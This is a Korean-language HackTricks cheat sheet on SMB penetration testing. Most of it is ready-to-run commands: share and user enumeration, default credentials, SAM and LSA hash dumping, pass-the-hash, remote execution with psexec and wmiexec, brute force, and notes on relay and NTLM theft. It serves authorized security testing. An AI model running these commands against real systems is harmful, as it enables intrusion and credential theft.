# 139,445 - SMB Pentesting

<details>

<summary><strong>AWS 해킹을 처음부터 전문가까지 배우세요</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하고 싶다면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 굿즈**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f)에 가입하거나 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **해킹 트릭을 공유하려면 PR을 제출하여** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 기여하세요.

</details>

## **포트 139**

_**네트워크 기본 입력 출력 시스템**_** (NetBIOS)**는 로컬 영역 네트워크(LAN) 내의 응용 프로그램, PC 및 데스크톱이 네트워크 하드웨어와 상호 작용하고 **네트워크를 통해 데이터를 전송하는 것을 용이하게 하는** 소프트웨어 프로토콜입니다. NetBIOS 네트워크에서 작동하는 소프트웨어 응용 프로그램의 식별 및 위치는 최대 16자까지의 NetBIOS 이름을 통해 달성되며 컴퓨터 이름과 일반적으로 다릅니다. 두 응용 프로그램 간의 NetBIOS 세션은 클라이언트로 작동하는 한 응용 프로그램이 다른 서버로 작동하는 응용 프로그램을 "호출"하는 명령을 내릴 때 **TCP 포트 139**를 사용하여 시작됩니다.
```
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
```
## 포트 445

기술적으로 포트 139는 'NBT over IP'로 지칭되며, 포트 445는 'SMB over IP'로 식별됩니다. 약어 **SMB**는 '**Server Message Blocks**'의 약어로, 현대적으로는 **Common Internet File System (CIFS)**로도 알려져 있습니다. 응용 계층 네트워크 프로토콜인 SMB/CIFS는 주로 파일, 프린터, 시리얼 포트에 대한 공유 액세스를 가능하게 하고 네트워크 상의 노드 간 다양한 형태의 통신을 용이하게 합니다.

예를 들어, Windows의 경우, SMB는 TCP/IP 상에서 직접 작동할 수 있으며, NetBIOS over TCP/IP가 필요하지 않도록 포트 445를 활용합니다. 반면, 다른 시스템에서는 포트 139의 사용이 관찰되며, 이는 SMB가 NetBIOS over TCP/IP와 함께 실행되고 있음을 나타냅니다.
```
445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
```
### SMB

**서버 메시지 블록 (SMB)** 프로토콜은 **클라이언트-서버** 모델에서 작동하며 **파일, 디렉토리 및 프린터, 라우터와 같은 네트워크 자원에 대한 액세스**를 조절하기 위해 설계되었습니다. 주로 **Windows** 운영 체제 시리즈 내에서 사용되며, SMB는 Microsoft의 최신 운영 체제를 실행하는 장치가 이전 버전을 실행하는 장치와 원활하게 상호 작용할 수 있도록 역 호환성을 보장합니다. 또한 **Samba** 프로젝트는 무료 소프트웨어 솔루션을 제공하여 SMB를 **Linux** 및 Unix 시스템에 구현할 수 있도록 하여 SMB를 통한 크로스 플랫폼 통신을 용이하게 합니다.

**임의의 로컬 파일 시스템 부분**을 나타내는 공유는 SMB 서버에서 제공될 수 있으며, 이를 통해 클라이언트가 서버의 실제 구조와 **부분적으로 독립적인** 계층 구조를 볼 수 있습니다. **액세스 제어 목록 (ACL)**은 **액세스 권한을 정의**하며, **`실행`**, **`읽기`**, **`전체 액세스`**와 같은 속성을 포함하여 사용자 권한에 대한 **세밀한 제어**를 가능하게 합니다. 이러한 권한은 공유에 기반하여 개별 사용자 또는 그룹에 할당될 수 있으며, 서버에 설정된 로컬 권한과 구분됩니다.

### IPC$ 공유

IPC$ 공유에 대한 액세스는 익명 널 세션을 통해 얻을 수 있으며, 이름 있는 파이프를 통해 노출된 서비스와 상호 작용할 수 있습니다. `enum4linux` 유틸리티는 이러한 목적에 유용합니다. 올바르게 활용하면 다음을 획득할 수 있습니다:

* 운영 체제에 대한 정보
* 상위 도메인에 대한 세부 정보
* 로컬 사용자 및 그룹의 컴파일
* 사용 가능한 SMB 공유에 대한 정보
* 효과적인 시스템 보안 정책

이 기능은 네트워크 관리자와 보안 전문가가 네트워크 상의 SMB (서버 메시지 블록) 서비스의 보안 포지션을 평가하는 데 중요합니다. `enum4linux`는 대상 시스템의 SMB 환경에 대한 포괄적인 정보를 제공하여 잠재적인 취약점을 식별하고 SMB 서비스가 적절하게 보호되었는지 확인하는 데 필수적입니다.
```bash
enum4linux -a target_ip
```
위의 명령어는 `enum4linux`가 `target_ip`로 지정된 대상에 대해 완전한 열거를 수행하는 방법의 예입니다.

## NTLM이란

NTLM이 무엇인지 모르거나 어떻게 작동하는지 및 어떻게 악용할 수 있는지 알고 싶다면, **NTLM**에 관한 이 페이지를 매우 흥미롭게 찾을 것입니다. 여기에서는 **이 프로토콜이 어떻게 작동하며 어떻게 그것을 악용할 수 있는지에 대해 설명되어 있습니다:**

{% content-ref url="../windows-hardening/ntlm/" %}
[ntlm](../windows-hardening/ntlm/)
{% endcontent-ref %}

## **서버 열거**

### **스캔**을 통해 호스트를 검색하는 네트워크:
```bash
nbtscan -r 192.168.0.1/24
```
### SMB 서버 버전

SMB 버전에 대한 가능한 취약점을 찾으려면 사용 중인 버전을 알아야 합니다. 다른 사용된 도구에서 이 정보가 나타나지 않는 경우 다음을 수행할 수 있습니다:

* **MSF** 보조 모듈 \_**auxiliary/scanner/smb/smb\_version**을 사용합니다.
* 또는 이 스크립트를 사용합니다:
```bash
#!/bin/sh
#Author: rewardone
#Description:
# Requires root or enough permissions to use tcpdump
# Will listen for the first 7 packets of a null login
# and grab the SMB Version
#Notes:
# Will sometimes not capture or will print multiple
# lines. May need to run a second time for success.
if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi
if [ ! -z $2 ]; then rport=$2; else rport=139; fi
tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " &
echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
echo "" && sleep .1
```
### **악용 검색**
```bash
msf> search type:exploit platform:windows target:2008 smb
searchsploit microsoft smb
```
### **가능한** 자격 증명

| **사용자 이름**      | **일반적인 암호**                      |
| -------------------- | ----------------------------------------- |
| _(공백)_            | _(공백)_                                 |
| guest                | _(공백)_                                 |
| Administrator, admin | _(공백)_, password, administrator, admin |
| arcserve             | arcserve, backup                          |
| tivoli, tmersrvd     | tivoli, tmersrvd, admin                   |
| backupexec, backup   | backupexec, backup, arcada                |
| test, lab, demo      | password, test, lab, demo                 |

### 브루트 포스

* [**SMB 브루트 포스**](../generic-methodologies-and-resources/brute-force.md#smb)

### SMB 환경 정보

### 정보 획득
```bash
#Dump interesting information
enum4linux -a [-u "<username>" -p "<passwd>"] <IP>
enum4linux-ng -A [-u "<username>" -p "<passwd>"] <IP>
nmap --script "safe or smb-enum-*" -p 445 <IP>

#Connect to the rpc
rpcclient -U "" -N <IP> #No creds
rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash
rpcclient -U "username%passwd" <IP> #With creds
#You can use querydispinfo and enumdomusers to query user information

#Dump user information
/usr/share/doc/python3-impacket/examples/samrdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/samrdump.py -port 445 [[domain/]username[:password]@]<targetName or address>

#Map possible RPC endpoints
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password]@]<targetName or address>
```
### 사용자, 그룹 및 로그인된 사용자 열거

이 정보는 이미 enum4linux 및 enum4linux-ng에서 수집되어야 합니다.
```bash
crackmapexec smb 10.10.10.10 --users [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups --loggedon-users [-u <username> -p <password>]

ldapsearch -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "(&(objectclass=user))" -h 10.10.10.10 | grep -i samaccountname: | cut -f 2 -d " "

rpcclient -U "" -N 10.10.10.10
enumdomusers
enumdomgroups
```
### 로컬 사용자 열거

[Impacket](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py)
```bash
lookupsid.py -no-pass hostname.local
```
한 줄 요약
```bash
for i in $(seq 500 1100);do rpcclient -N -U "" 10.10.10.10 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```
### Metasploit - 로컬 사용자 열거
```bash
use auxiliary/scanner/smb/smb_lookupsid
set rhosts hostname.local
run
```
### **LSARPC 및 SAMR rpcclient 열거**

{% content-ref url="pentesting-smb/rpcclient-enumeration.md" %}
[rpcclient-enumeration.md](pentesting-smb/rpcclient-enumeration.md)
{% endcontent-ref %}

### Linux에서 GUI 연결

#### 터미널에서:

`xdg-open smb://cascade.htb/`

#### 파일 브라우저 창에서 (nautilus, thunar 등)

`smb://friendzone.htb/general/`

## 공유 폴더 열거

### 공유 폴더 목록

언제나 무언가에 접근할 수 있는지 확인하는 것이 좋습니다. 자격 증명이 없는 경우 **null 자격 증명/게스트 사용자**를 사용해 보십시오.
```bash
smbclient --no-pass -L //<IP> # Null user
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash

smbmap -H <IP> [-P <PORT>] #Null user
smbmap -u "username" -p "password" -H <IP> [-P <PORT>] #Creds
smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>] #Pass-the-Hash
smbmap -R -u "username" -p "password" -H <IP> [-P <PORT>] #Recursive list

crackmapexec smb <IP> -u '' -p '' --shares #Null user
crackmapexec smb <IP> -u 'username' -p 'password' --shares #Guest user
crackmapexec smb <IP> -u 'username' -H '<HASH>' --shares #Guest user
```
### **공유 폴더 연결/목록**
```bash
#Connect using smbclient
smbclient --no-pass //<IP>/<Folder>
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
#Use --no-pass -c 'recurse;ls'  to list recursively with smbclient

#List with smbmap, without folder it list everything
smbmap [-u "username" -p "password"] -R [Folder] -H <IP> [-P <PORT>] # Recursive list
smbmap [-u "username" -p "password"] -r [Folder] -H <IP> [-P <PORT>] # Non-Recursive list
smbmap -u "username" -p "<NT>:<LM>" [-r/-R] [Folder] -H <IP> [-P <PORT>] #Pass-the-Hash
```
### **Windows 공유를 수동으로 열거하고 연결하기**

호스트 머신의 공유를 표시하는 것이 제한될 수 있으며, 공유 목록을 표시하려고 시도하면 연결할 수 있는 공유가 없는 것처럼 보일 수 있습니다. 따라서 공유에 수동으로 연결해 보는 것이 좋을 수 있습니다. 공유를 수동으로 열거하려면 유효한 세션(예: 널 세션 또는 유효 자격 증명)을 사용할 때 NT\_STATUS\_ACCESS\_DENIED 및 NT\_STATUS\_BAD\_NETWORK\_NAME과 같은 응답을 찾아볼 수 있습니다. 이러한 응답은 공유가 존재하고 액세스할 수 없는 경우 또는 공유가 전혀 존재하지 않는 경우를 나타낼 수 있습니다.

Windows 대상의 일반적인 공유 이름은 다음과 같습니다.

* C$
* D$
* ADMIN$
* IPC$
* PRINT$
* FAX$
* SYSVOL
* NETLOGON

(_**Network Security Assessment 3rd edition**_에서 가져온 일반적인 공유 이름)

다음 명령을 사용하여 이러한 공유에 연결을 시도할 수 있습니다.
```bash
smbclient -U '%' -N \\\\<IP>\\<SHARE> # null session to connect to a windows share
smbclient -U '<USER>' \\\\<IP>\\<SHARE> # authenticated session to connect to a windows share (you will be prompted for a password)
```
또는 이 스크립트(널 세션 사용)
```bash
#/bin/bash

ip='<TARGET-IP-HERE>'
shares=('C$' 'D$' 'ADMIN$' 'IPC$' 'PRINT$' 'FAX$' 'SYSVOL' 'NETLOGON')

for share in ${shares[*]}; do
output=$(smbclient -U '%' -N \\\\$ip\\$share -c '')

if [[ -z $output ]]; then
echo "[+] creating a null session is possible for $share" # no output if command goes through, thus assuming that a session was created
else
echo $output # echo error message (e.g. NT_STATUS_ACCESS_DENIED or NT_STATUS_BAD_NETWORK_NAME)
fi
done
```
예시
```bash
smbclient -U '%' -N \\\\192.168.0.24\\im_clearly_not_here # returns NT_STATUS_BAD_NETWORK_NAME
smbclient -U '%' -N \\\\192.168.0.24\\ADMIN$ # returns NT_STATUS_ACCESS_DENIED or even gives you a session
```
### **Windows에서 쉐어 목록 열거하기 / 서드파티 도구 없이**

PowerShell
```powershell
# Retrieves the SMB shares on the locale computer.
Get-SmbShare
Get-WmiObject -Class Win32_Share
# Retrieves the SMB shares on a remote computer.
get-smbshare -CimSession "<computer name or session object>"
# Retrieves the connections established from the local SMB client to the SMB servers.
Get-SmbConnection
```
CMD 콘솔
```shell
# List shares on the local computer
net share
# List shares on a remote computer (including hidden ones)
net view \\<ip> /all
```
MMC 스냅인 (그래픽)
```shell
# Shared Folders: Shared Folders > Shares
fsmgmt.msc
# Computer Management: Computer Management > System Tools > Shared Folders > Shares
compmgmt.msc
```
explorer.exe (그래픽), 사용 가능한 숨겨지지 않은 공유를 보려면 `\\<ip>\`를 입력하십시오.

### 공유 폴더 마운트
```bash
mount -t cifs //x.x.x.x/share /mnt/share
mount -t cifs -o "username=user,password=password" //x.x.x.x/share /mnt/share
```
### **파일 다운로드**

자격 증명/패스 더 해시를 사용하여 연결하는 방법을 배우려면 이전 섹션을 읽으십시오.
```bash
#Search a file and download
sudo smbmap -R Folder -H <IP> -A <FileName> -q # Search the file in recursive mode and download it inside /usr/share/smbmap
```

```bash
#Download all
smbclient //<IP>/<share>
> mask ""
> recurse
> prompt
> mget *
#Download everything to current directory
```
### 도메인 공유 폴더 검색

* [**Snaffler**](https://github.com/SnaffCon/Snaffler)\*\*\*\*

명령어:

* mask: 디렉토리 내의 파일을 필터링하는 데 사용되는 마스크를 지정합니다 (예: "" 모든 파일에 대해)
* recurse: 재귀를 토글합니다 (기본값: 끔)
* prompt: 파일 이름에 대한 프롬프트를 토글합니다 (기본값: 켬)
* mget: 호스트에서 클라이언트 머신으로 마스크와 일치하는 모든 파일을 복사합니다

(_smbclient의 manpage에서의 정보_)
```bash
Snaffler.exe -s -d domain.local -o snaffler.log -v data
```
* [**CrackMapExec**](https://wiki.porchetta.industries/smb-protocol/spidering-shares) 스파이더.
* `-M spider_plus [--share <share_name>]`
* `--pattern txt`
```bash
sudo crackmapexec smb 10.10.10.10 -u username -p pass -M spider_plus --share 'Department Shares'
```
특히 주목할 만한 것은 **`Registry.xml`**이라는 파일들인데, 이 파일들은 **그룹 정책을 통해 자동 로그온이 구성된 사용자들의 암호**를 포함할 수 있습니다. 또는 **`web.config`** 파일들인데, 이 파일들은 자격 증명을 포함할 수 있습니다.

{% hint style="info" %}
**SYSVOL 공유**는 도메인의 모든 인증된 사용자가 **읽을 수 있는** 공유입니다. 여기에는 다양한 배치, VBScript 및 PowerShell **스크립트**가 포함될 수 있습니다.\
내부의 **스크립트**를 확인해야 합니다. 그곳에서 **암호**와 같은 민감한 정보를 **찾을 수** 있을 수도 있습니다.
{% endhint %}

## 레지스트리 읽기

발견된 자격 증명을 사용하여 레지스트리를 **읽을 수** 있을 수 있습니다. Impacket **`reg.py`**를 사용하여 시도할 수 있습니다:
```bash
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKCU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKLM -s
```
## 포스트 익스플로잇레이션

**Samba** 서버의 기본 구성은 일반적으로 `/etc/samba/smb.conf`에 위치하며 일부 **위험한 구성**이 있을 수 있습니다:

| **설정**                    | **설명**                                                             |
| --------------------------- | ------------------------------------------------------------------- |
| `browseable = yes`          | 현재 공유에서 사용 가능한 공유 목록을 허용합니까?                   |
| `read only = no`            | 파일의 생성 및 수정을 금지합니까?                                   |
| `writable = yes`            | 사용자가 파일을 생성하고 수정할 수 있습니까?                        |
| `guest ok = yes`            | 비밀번호를 사용하지 않고 서비스에 연결을 허용합니까?                 |
| `enable privileges = yes`   | 특정 SID에 할당된 권한을 존중합니까?                                |
| `create mask = 0777`        | 새로 생성된 파일에 할당해야 하는 권한은 무엇입니까?                 |
| `directory mask = 0777`     | 새로 생성된 디렉토리에 할당해야 하는 권한은 무엇입니까?           |
| `logon script = script.sh`  | 사용자 로그인 시 실행해야 하는 스크립트는 무엇입니까?               |
| `magic script = script.sh`  | 스크립트가 닫힐 때 실행해야 하는 스크립트는 무엇입니까?           |
| `magic output = script.out` | 마법 스크립트의 출력을 저장해야 하는 위치는 어디입니까?            |

명령어 `smbstatus`는 **서버** 및 **누가 연결되어 있는지**에 대한 정보를 제공합니다.

## Kerberos를 사용하여 인증

**smbclient** 및 **rpcclient** 도구를 사용하여 **kerberos**에 **인증**할 수 있습니다:
```bash
smbclient --kerberos //ws01win10.domain.com/C$
rpcclient -k ws01win10.domain.com
```
## **명령어 실행**

### **crackmapexec**

crackmapexec은 **wmiexec**가 **기본** 방법인 **mmcexec, smbexec, atexec, wmiexec** 중 **어떤 것**이든 **남용**하여 명령을 실행할 수 있습니다. 사용하려는 옵션을 `--exec-method` 매개변수로 지정할 수 있습니다:
```bash
apt-get install crackmapexec

crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' #Execute Powershell
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami #Excute cmd
crackmapexec smb 192.168.10.11 -u Administrator -H <NTHASH> -x whoami #Pass-the-Hash
# Using --exec-method {mmcexec,smbexec,atexec,wmiexec}

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sam #Dump SAM
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --lsa #Dump LSASS in memmory hashes
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sessions #Get sessions (
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --loggedon-users #Get logged-on users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --disks #Enumerate the disks
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --users #Enumerate users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --groups # Enumerate groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --local-groups # Enumerate local groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --pass-pol #Get password policy
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --rid-brute #RID brute

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -H <HASH> #Pass-The-Hash
```
### [**psexec**](../windows-hardening/ntlm/psexec-and-winexec.md)**/**[**smbexec**](../windows-hardening/ntlm/smbexec.md)

두 옵션 모두 피해자 컴퓨터에 _\pipe\svcctl_을 통해 새 서비스를 **생성**하고 이를 사용하여 **무언가를 실행**합니다 (**psexec**은 실행 파일을 ADMIN$ 공유에 **업로드**하고 **smbexec**은 **cmd.exe/powershell.exe**를 가리키며 인수에 페이로드를 넣습니다 --**파일 없는 기술--**-).\
[**psexec** ](../windows-hardening/ntlm/psexec-and-winexec.md)및 [**smbexec**](../windows-hardening/ntlm/smbexec.md)에 대한 **추가 정보**.\
**kali**에서는 /usr/share/doc/python3-impacket/examples/에 위치합니다.
```bash
#If no password is provided, it will be prompted
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t # Use pass the hash
```
**매개변수**`-k`를 사용하여 **NTLM** 대신 **kerberos**에 대해 인증할 수 있습니다.

### [wmiexec](../windows-hardening/ntlm/wmicexec.md)/dcomexec

**포트 135**를 통해 **DCOM**을 사용하여 디스크를 건드리지 않고 새 서비스를 실행하지 않고 명령 셸을 은밀하게 실행합니다.\
**kali**에서는 /usr/share/doc/python3-impacket/examples/에 위치합니다.
```bash
#If no password is provided, it will be prompted
./wmiexec.py [[domain/]username[:password]@]<targetName or address> #Prompt for password
./wmiexec.py -hashes LM:NT administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
```
**매개변수**`-k`를 사용하여 **NTLM** 대신 **kerberos**에 대해 인증할 수 있습니다.
```bash
#If no password is provided, it will be prompted
./dcomexec.py [[domain/]username[:password]@]<targetName or address>
./dcomexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
```
### [AtExec](../windows-hardening/ntlm/atexec.md)

_\\pipe\atsvc_를 통해 작업 스케줄러를 통해 명령을 실행합니다.\
**kali**에서는 /usr/share/doc/python3-impacket/examples/에 위치합니다.
```bash
./atexec.py [[domain/]username[:password]@]<targetName or address> "command"
./atexec.py -hashes <LM:NT> administrator@10.10.10.175 "whoami"
```
## Impacket 참조

[https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)

## **사용자 자격 증명 브루트포스**

**이것은 권장되지 않습니다. 최대 허용 시도 횟수를 초과하면 계정이 차단될 수 있습니다**
```bash
nmap --script smb-brute -p 445 <IP>
ridenum.py <IP> 500 50000 /root/passwds.txt #Get usernames bruteforcing that rids and then try to bruteforce each user name
```
## SMB 릴레이 공격

이 공격은 Responder 툴킷을 사용하여 내부 네트워크에서 **SMB 인증 세션을 캡처**하고 **타겟 머신**으로 **릴레이**하는 것을 의미합니다. 인증 **세션이 성공하면**, 자동으로 **시스템 쉘**로 진입합니다.\
[**이 공격에 대한 자세한 정보는 여기에서 확인하세요.**](../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

## SMB-Trap

Windows 라이브러리 URLMon.dll은 페이지가 SMB를 통해 일부 콘텐츠에 액세스하려고 시도할 때 호스트에 자동으로 인증을 시도합니다. 예를 들어: `img src="\\10.10.10.10\path\image.jpg"`

이는 다음 함수들로 발생합니다:

* URLDownloadToFile
* URLDownloadToCache
* URLOpenStream
* URLOpenBlockingStream

이 함수들은 일부 브라우저 및 도구 (예: Skype)에서 사용됩니다.

![출처: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html](<../.gitbook/assets/image (93).png>)

### MitMf를 사용한 SMBTrap

![출처: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html](<../.gitbook/assets/image (94).png>)

## NTLM 도용

SMB 함정과 유사하게, 악의적인 파일을 대상 시스템에 심는 것 (예: SMB를 통해)은 SMB 인증 시도를 유도할 수 있으며, 이를 통해 NetNTLMv2 해시를 Responder와 같은 도구로 가로챌 수 있습니다. 해당 해시는 오프라인에서 해독되거나 [SMB 릴레이 공격](pentesting-smb.md#smb-relay-attack)에 사용될 수 있습니다.

[참조: ntlm\_theft](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#ntlm\_theft)

## HackTricks 자동 명령어
```
Protocol_Name: SMB    #Protocol Abbreviation if there is one.
Port_Number:  137,138,139     #Comma separated if there is more than one.
Protocol_Description: Server Message Block         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMB
Note: |
While Port 139 is known technically as ‘NBT over IP’, Port 445 is ‘SMB over IP’. SMB stands for ‘Server Message Blocks’. Server Message Block in modern language is also known as Common Internet File System. The system operates as an application-layer network protocol primarily used for offering shared access to files, printers, serial ports, and other sorts of communications between nodes on a network.

#These are the commands I run in order every time I see an open SMB port

With No Creds
nbtscan {IP}
smbmap -H {IP}
smbmap -H {IP} -u null -p null
smbmap -H {IP} -u guest
smbclient -N -L //{IP}
smbclient -N //{IP}/ --option="client min protocol"=LANMAN1
rpcclient {IP}
rpcclient -U "" {IP}
crackmapexec smb {IP}
crackmapexec smb {IP} --pass-pol -u "" -p ""
crackmapexec smb {IP} --pass-pol -u "guest" -p ""
GetADUsers.py -dc-ip {IP} "{Domain_Name}/" -all
GetNPUsers.py -dc-ip {IP} -request "{Domain_Name}/" -format hashcat
GetUserSPNs.py -dc-ip {IP} -request "{Domain_Name}/"
getArch.py -target {IP}

With Creds
smbmap -H {IP} -u {Username} -p {Password}
smbclient "\\\\{IP}\\\" -U {Username} -W {Domain_Name} -l {IP}
smbclient "\\\\{IP}\\\" -U {Username} -W {Domain_Name} -l {IP} --pw-nt-hash `hash`
crackmapexec smb {IP} -u {Username} -p {Password} --shares
GetADUsers.py {Domain_Name}/{Username}:{Password} -all
GetNPUsers.py {Domain_Name}/{Username}:{Password} -request -format hashcat
GetUserSPNs.py {Domain_Name}/{Username}:{Password} -request

https://book.hacktricks.xyz/pentesting/pentesting-smb

Entry_2:
Name: Enum4Linux
Description: General SMB Scan
Command: enum4linux -a {IP}

Entry_3:
Name: Nmap SMB Scan 1
Description: SMB Vuln Scan With Nmap
Command: nmap -p 139,445 -vv -Pn --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse {IP}

Entry_4:
Name: Nmap Smb Scan 2
Description: SMB Vuln Scan With Nmap (Less Specific)
Command: nmap --script 'smb-vuln*' -Pn -p 139,445 {IP}

Entry_5:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} {IP} smb

Entry_6:
Name: SMB/SMB2 139/445 consolesless mfs enumeration
Description: SMB/SMB2 139/445  enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 445; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 445; run; exit'

```
<details>

<summary><strong>htARTE (HackTricks AWS Red Team 전문가)로부터 AWS 해킹을 제로부터 전문가까지 배우세요</strong></summary>

다른 방법으로 HackTricks를 지원하는 방법:

* **회사가 HackTricks에서 광고되길 원하거나 HackTricks를 PDF로 다운로드하길 원한다면** [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [Discord 그룹](https://discord.gg/hRep4RUj7f)** 또는 [telegram 그룹](https://t.me/peass)에 **가입**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)을 **팔로우**하세요.
* **해킹 트릭을 공유하고 싶다면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>
